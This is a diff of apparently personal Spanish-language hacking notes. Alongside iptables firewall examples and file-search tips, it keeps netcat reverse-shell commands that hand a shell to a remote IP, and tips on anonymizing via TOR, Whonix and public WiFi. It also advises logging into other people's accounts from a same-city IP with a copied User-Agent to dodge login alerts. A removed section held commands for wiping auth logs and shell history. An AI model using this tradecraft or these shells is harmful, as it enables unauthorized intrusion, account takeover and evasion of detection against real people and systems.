@@ -1213,31 +1213,30 @@ Failed during this command:
 Notas utiles: https://github.com/nanis/Crypt-SSLeay
               https://metacpan.org/pod/Crypt::SSLeay#INSTALL
               
-_______________________________________________________________________________________________________________________
 
 
 
-_______________________________________________________________________________________________________________________
+
+ _  _  ___  ___ __   _  ___ 
+| \| || __||_ _/ _| / \|_ _|
+| \\ || _|  | ( (_ | o || | 
+|_|\_||___| |_|\__||_n_||_| 
+                          
+NETCAT
+
+#netcat -lpv 9999                         → escuchando en el puerto 9999
+#netcat -e /bin/sh 192.9.200.99 9999      →se conecta al listen abierto en el anterior comando abriendo una shell(LINUX)
+#netcat -e cmd.exe 192.9.200.99 9999      →se conecta al listen abierto y abre una terminal cmd.exe" WINDOWS
+#nc -n -X 5 -x 127.0.0.1:9050 <target_host> <target_port>  →Pasar el tráfico de nc a través de TOR
 
 
-«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
 
-netcat:
+ _  ___ ___  _   ___ _    ___  __ 
+| || o \_ _|/ \ | o ) |  | __|/ _|
+| ||  _/| || o || o \ |_ | _| \_ \
+|_||_|  |_||_n_||___/___||___||__/
 
-
-$ netcat -lpv 9999 
-"escuchando en el puerto 9999"
-
-$ netcat -e /bin/sh 192.9.200.99 9999
-"se conecta al listen abierto en el anterior comando abriendo una shell" LINUX
-
-$ netcat -e cmd.exe 192.9.200.99 9999
-"se conecta al listen abierto y abre una terminal cmd.exe" WINDOWS
-
-
-«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
-
-iptables:
+IPTABLES
 
 chains: INPUT/OUTPUT/FORWARD
 rules: ACCEPT/DROP(descarta)/REJECT(rechaza)/POSTROUTING(encaminamiento posterior)
@@ -1257,69 +1256,69 @@ rules: ACCEPT/DROP(descarta)/REJECT(rechaza)/POSTROUTING(encaminamiento posterio
 
 Ejemplos de Reglas:
 
-$ iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT
+#iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT
 "Reenvío desde una interfaz de red local (eth1) hacia una interfaz de red publica (eth0)
 
-$ iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT
+#iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT
 "Aceptar reenviar los paquetes que son parte de conexiones existentes (ESTABLISHED) o relacionadas de tráfico entrante desde la interfaz eth1 para tráfico saliente por la interfaz eth0:"
 
-$ iptables -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
+#iptables -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
 "Permitir paquetes en el pro	pio muro cortafuegos para tráfico saliente a través de la interfaz eth0 que son parte de conexiones existentes o relacionadas:"
 
-$ iptables -A INPUT -i eth1 -s 0/0 -d 0/0 -j ACCEPT
-$ iptables -A INPUT -i lo -s 0/0 -d 0/0 -j ACCEPT
+#iptables -A INPUT -i eth1 -s 0/0 -d 0/0 -j ACCEPT
+#iptables -A INPUT -i lo -s 0/0 -d 0/0 -j ACCEPT
 "Permitir (ACCEPT) todo el tráfico entrante (INPUT) desde (-s) cualquier dirección (0/0) la red local (eth1) y desde el retorno del sistema (lo) hacia (-d) cualquier destino (0/0):"
 
-$ iptables -A POSTROUTING -t nat -s 192.168.0.0/24 -o eth0 -j SNAT --to-source x.y.z.c
+#iptables -A POSTROUTING -t nat -s 192.168.0.0/24 -o eth0 -j SNAT --to-source x.y.z.c
 "Hacer (-j) SNAT para el tráfico saliente (-o) a tráves de la interfaz eth0 proveniente desde (-s) la red local (192.168.0.0/24) utilizando (--to-source) la dirección IP w.x.y.z."
 
-$ iptables -A INPUT -i eth0 -s w.x.y.x/32 -j DROP
-$ iptables -A INPUT -i eth0 -s 192.168.0.0/24 -j DROP
-$ iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
+#iptables -A INPUT -i eth0 -s w.x.y.x/32 -j DROP
+#iptables -A INPUT -i eth0 -s 192.168.0.0/24 -j DROP
+#iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
 "Descartar (DROP) todo el tráfico entrante (-i) desde la interfaz eth0 que trate de utilizar la dirección IP pública del servidor (w.x.y.z), alguna dirección IP de la red local (192.168.0.0/24) o la dirección IP del retorno del sistema (127.0.01)"
 
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 25 --syn -j ACCEPT
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 80 --syn -j ACCEPT
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 443 --syn -j ACCEPT
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 22 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 25 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 80 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 443 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 22 --syn -j ACCEPT
 "Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos SMTP (25), HTTP(80), HTTPS (443) y SSH (22):"
 
-$ iptables -A INPUT -p tcp -s 0/0 -d w.x.y.z/32 --destination-port 25 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d w.x.y.z/32 --destination-port 25 --syn -j ACCEPT
 "Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-tcp) para los puertos (--destination-port) del protocolos SMTP (25) en el servidor (w.x.y.z/32), desde (-s) cualquier lugar (0/0) hacia (-d) cualquier lugar (0/0)."
 
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 110 --syn -j ACCEPT
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 995 --syn -j ACCEPT
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 143 --syn -j ACCEPT
-$ iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 993 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 110 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 995 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 143 --syn -j ACCEPT
+#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 993 --syn -j ACCEPT
 "Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos POP3 (110), POP3S (995), IMAP (143) y IMAPS (993):"
 
-$ iptables -A INPUT -i eth1 -p tcp --sport 68 --dport 67 -j ACCEPT
-$ iptables -A INPUT -i eth1 -p udp --sport 68 --dport 67 -j ACCEPT
+#iptables -A INPUT -i eth1 -p tcp --sport 68 --dport 67 -j ACCEPT
+#iptables -A INPUT -i eth1 -p udp --sport 68 --dport 67 -j ACCEPT
 "Aceptar (ACCEPT) el tráfico entrante (-i) proveniente desde la interfaz eth1 cuando las conexiones se establezcan desde el puerto  (--sport) 67 por protocolos (-p) TCP y UDP."
 
-$ iptables -A INPUT -p udp -s 200.33.146.217/32 --source-port 53 -d 0/0 -j ACCEPT
+#iptables -A INPUT -p udp -s 200.33.146.217/32 --source-port 53 -d 0/0 -j ACCEPT
 "Aceptar (ACCEPT) conexiones de tráfico entrante (INPUT) por protocolo (-p) UDP cuando se establezcan desde (-s) el servidor DNS 200.33.145.217 desde el puerto (--source-port) 53 hacia (-d) cualquier destino (0/0):"
 
-$ iptables -A INPUT -p tcp --destination-port 22 -j DROP
-$ iptables -A INPUT -p tcp --destination-port 23 -j DROP
+#iptables -A INPUT -p tcp --destination-port 22 -j DROP
+#iptables -A INPUT -p tcp --destination-port 23 -j DROP
 "Descartar (DROP) el tráfico entrante (INPUT) para el protocolo (-p) TCP hacia los puerto (--destination-port) de SSH (22) y Telnet (23):"
 
-$ iptables -A INPUT -s a.b.c.d -j DROP
+#iptables -A INPUT -s a.b.c.d -j DROP
 "Descartar (DROP) todo tipo de conexiones de tráfico entrante (INPUT) desde (-s) la dirección IP a.b.c.d:"
 
-$ iptables -A OUTPUT -d a.b.c.d -s 192.168.0.0/24 -j REJECT
+#iptables -A OUTPUT -d a.b.c.d -s 192.168.0.0/24 -j REJECT
 "Rechazar (REJECT) conexiones hacia (OUTPUT) la dirección IP a.b.c.d desde la red local:"
 
 
-$ iptables -L
-$ iptables -S TCP
-$ iptables -L INPUT
-$ iptables -L INPUT -v
-$ iptables -Z                    "resetea el conteo de paquetes"
-$ iptables -L --line-numbers
-$ iptables -D                    "numero de regla" + "chain" Ex. iptables -D 3 INPUT
-$ iptables -F "chain"            "flush a single chain"
-$ iptables -F                    "flush all chains"
+#iptables -L
+#iptables -S TCP
+#iptables -L INPUT
+#iptables -L INPUT -v
+#iptables -Z                    "resetea el conteo de paquetes"
+#iptables -L --line-numbers
+#iptables -D                    "numero de regla" + "chain" Ex. iptables -D 3 INPUT
+#iptables -F "chain"            "flush a single chain"
+#iptables -F                    "flush all chains"
 
 
                       FLUSH ALL RULES, DELETE ALL CHAINS AND ACCEPT ALL
@@ -1328,132 +1327,74 @@ $ iptables -F                    "flush all chains"
 
 "First, set the default policies for each of the built-in chains to ACCEPT. The main reason to do this is to ensure that you won't be locked out from your server via SSH:"
 
-$ iptables -P INPUT ACCEPT
-$ iptables -P FORWARD ACCEPT
-$ iptables -P OUTPUT ACCEPT
+#iptables -P INPUT ACCEPT
+#Iptables -P FORWARD ACCEPT
+#iptables -P OUTPUT ACCEPT
 
 "Then flush the nat and mangle tables, flush all chains (-F), and delete all non-default chains (-X):"
 
-$ iptables -t nat -F
-$ iptables -t mangle -F
-$ iptables -F 
-$ iptables -X
+#iptables -t nat -F
+#iptables -t mangle -F
+#iptables -F 
+#iptables -X
 
 "Your firewall will now allow all network traffic. If you list your rules now, you will will see there are none, and only the three default chains (INPUT, FORWARD, and OUTPUT) remain."
 
 
 nmap error: offending packet
-$iptables -A OUTPUT -m state --state NEW,ESTABLISHED,RELATED,INVALID -j ACCEPT
-$iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-
-«««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
-
-
-buscar archivos:
-
-$ find /etc/ -name "issue*"
-"busca por nombre"
-
-$ find / -perm 777
-"busca por permisos"
-
-$ find / -user root
-"busca por usuario"
-
-$ find /dir/to/search -type f -exec sh -c 'file -b {} | grep text &>/dev/null' \; -print
-"buscar archivos humman-readables"
-
-$ find -type f -size 1033c -exec sh -c 'file -b {} | grep text &>/dev/null' \; -print
-"buscar archivos hummand-readables con un tamaño especifico, ejemplo: 1033 bytes
-As units you can use:
-    b – for 512-byte blocks (this is the default if no suffix is used)
-    c – for bytes
-    w – for two-byte words
-    k – for Kilobytes (units of 1024 bytes)
-    M – for Megabytes (units of 1048576 bytes)
-    G – for Gigabytes (units of 1073741824 bytes)
+#iptables -A OUTPUT -m state --state NEW,ESTABLISHED,RELATED,INVALID -j ACCEPT
+#iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
 
 
 «««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
+ _____ ___________  _____ 
+|_   _|_   _| ___ \/  ___|
+  | |   | | | |_/ /\ `--. 
+  | |   | | |  __/  `--. \
+  | |  _| |_| |    /\__/ /
+  \_/  \___/\_|    \____/ 
+                          
+                          TIPS:
+			  
+-1) Stay SAFE - Volúmenes encriptados+Whonix+TOR+an Anonymous WIFI ;)(thanks to the Estacion de Servicio+Biblioteca)
+-2) Mapping out the Target: fierce+Whois lookups on IP&Domain names+Reverse Whois lookups to find all IP addresses and domain names....repeatedly sobre todas las IP's y dominios con los que nos vayamos encontrando, google search's y todo lo que se nos ocurra para sacar una foto con paisaje de nuestro objetiscpvo, lo que sobra en la red es ¿....?, es ¿...?, es INFORMACION: Twitter-Fcbook-LKDIN-bla,bla,bla
+-3) Scanning&Exploiting: NMAP over todas las IP's(Services-MalasConfiguraciones-Software viejo)+Run NIKTO/WhatWeb/(Especific --> wpscan/CMS-explorer/Joomscan....)+
 
-
-history:
-
-$ history | awk '{print $2}' | awk 'BEGIN {FS="|"}{print $1}'  
-"ver comandos mas usados"
-
-$ echo "" /var/log/auth.log
-"limpiar auth log"
-
-$ echo "" ~/.bash_history -rf
-"limpiar bash history"
-
-$ history -c
-"limpiar history sesion reciente"
-
-$ export HISTSIZE=0
-"configura en 0 el maximo de history lines"
-
-$ unset HISTFILE
-"deshabilitar history- desloguearse despues
-
-$ kill -9 $$
-"kill current session"
-
-$ ln /dev/null ~/.bash_history -sf
-"envia todos los comandos de history a /dev/null"
-
-$ history | tail -50
-"ultimos 50 comandos"
-
-
-«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
-
-TIPS:
-- 1) Stay SAFE - Volúmenes encriptados+Whonix+TOR+an Anonymous WIFI ;)(thanks to the Estacion de Servicio+Biblioteca)
-- 2) Mapping out the Target: fierce+Whois lookups on IP&Domain names+Reverse Whois lookups to find all IP addresses and domain names....repeatedly sobre todas las IP's y dominios con los que nos vayamos encontrando, google search's y todo lo que se nos ocurra para sacar una foto con paisaje de nuestro objetiscpvo, lo que sobra en la red es ¿....?, es ¿...?, es INFORMACION: Twitter-Fcbook-LKDIN-bla,bla,bla
-- 3) Scanning&Exploiting: NMAP over todas las IP's(Services-MalasConfiguraciones-Software viejo)+Run NIKTO/WhatWeb/(Especific --> wpscan/CMS-explorer/Joomscan....)+
-
-- Cuando usemos el password de alguien para entrar a distintos servicios o aplicaciones, en lo posible deberíamos usar
+-Cuando usemos el password de alguien para entrar a distintos servicios o aplicaciones, en lo posible deberíamos usar
 una IP de la misma ciudad o al menos del mismo  pais. y copiar su User-Agent para que el usuario no reciba un email 
 sobre una nueva entrada a sus cuentas desde un nuevo dispositivo y desde un nuevo origen. (TKS Phineas Fisher, From
 Catalan Police Union Hack video  ;) ;) ;) ;)    
 
-- Cuando nos encontramos con un archivo en linux que empieza con el carácter "-" 
-  The usual way of doing this is to prefix the filename with a path - ./-, or /home/Tim/-. This technique is also used to get around similar issues where command line options clash with filenames, so a file referred to as ./-e does not appear as the -e command line option to a program, for example.
+-Cuando nos encontramos con un archivo en linux que empieza con el carácter "-" 
+The usual way of doing this is to prefix the filename with a path - ./-, or /home/Tim/-. This technique is also used to get around similar issues where command line options clash with filenames, so a file referred to as ./-e does not appear as the -e command line option to a program, for example.
 
-- Listar hidden files en un directorio: ls -a|less
+-Listar hidden files en un directorio: 
+#ls -a|less
 
-- Find humman-readable files on linux systems: 
-  find /dir/to/search -type f -exec sh -c 'file -b {} | grep text &>/dev/null' \; -print
-  
-- Listar recursivamente en un servidor ordenando por dueño y grupo, ademas podemos 'grep':
+-Find humman-readable files on linux systems: 
+#find /dir/to/search -type f -exec sh -c 'file -b {} | grep text &>/dev/null' \; -print
 
-    ls -l -R | sort -k 3 - sorts by owner and by default sorts the next field (group) and on
-    ls -l -R | sort -k 4,4 -k 3 |grep usuarioSeñorX - sorts by group and then by owner
-    ls -l -R | sort -k 3,3 -k 8 - sorts by owner and then by filename
+-Listar recursivamente en un servidor ordenando por dueño y grupo, ademas podemos 'grep':
+#ls -l -R | sort -k 3 - sorts by owner and by default sorts the next field (group) and on
+#ls -l -R | sort -k 4,4 -k 3 |grep usuarioSeñorX - sorts by group and then by owner
+#ls -l -R | sort -k 3,3 -k 8 - sorts by owner and then by filename
 
 
-- Buscar the only line of text data.txt that occurs only once:  < file.txt sort | uniq -u       # only print unique lines 
-        							< file.txt sort | uniq -d       # only print duplicate lines 
+-Buscar the only line of text data.txt that occurs only once:  
+#< file.txt sort | uniq -u       # only print unique lines 
+#< file.txt sort | uniq -d       # only print duplicate lines
 
-- Print solo readable-hummans lines on data.txt matching with the specific character "=" (signo igual): 
-  strings data.txt | grep =
+-Print solo readable-hummans lines on data.txt matching with the specific character "=" (signo igual): 
+#strings data.txt | grep =
 
-- Decodear una archivo ROT13: 
-  cat data.txt | tr a-zA-Z n-za-mN-ZA-M
+-Decodear una archivo ROT13: 
+#cat data.txt | tr a-zA-Z n-za-mN-ZA-M
 
-__________________________________________________GATHERING____________________________________________________________
-- Gathering: 1) Gathering Information 2) Network Range 3) Acitve Machines Identification 4) Open Ports & Aplications 5) Detecting OS 6) Fingerprint Services 7) MApping The Network            ..... ;)      Be quiet, be Ninja................
 
-- TOOLS.TRACEMYIP.ORG
-- https://myip.ms/view/ip_addresses
-- https://www.threatcrowd.org/
-- https://www.malwaredomainlist.com
-- http://www.senderbase.org/
-- 
-_______________________________________________________________________________________________________________________
+_______________________________________________________________________________________________________
+
 USB Vbox problems:
+
 1) First of all open regedit and navigate to HKEY_LOCAL_MACHINE > SYSTEM > CurrentControlSet > Control > Class > {36­FC9E60-C465-11CF-8056-44455354­0000}
 
 After you need to delete UpperFilters reg key from the right side.
@@ -1474,6 +1415,6 @@ referencias:
 -_-     mega.z
 
 https://github.com/enddo/awesome-windows-exploitation        //LISTA DE EXPLOITATIONS FOR...FOR....YES !!! FOR WINDOWS
-
+mega:#F!WZpkGaqC!GUWUUDUaYFkCXYxEChPurA!CZA3zZ7Z             //LISTA DE MANUALES SOBRE INFORMATICA
 
 _______________________________________________________________________________________________________________________
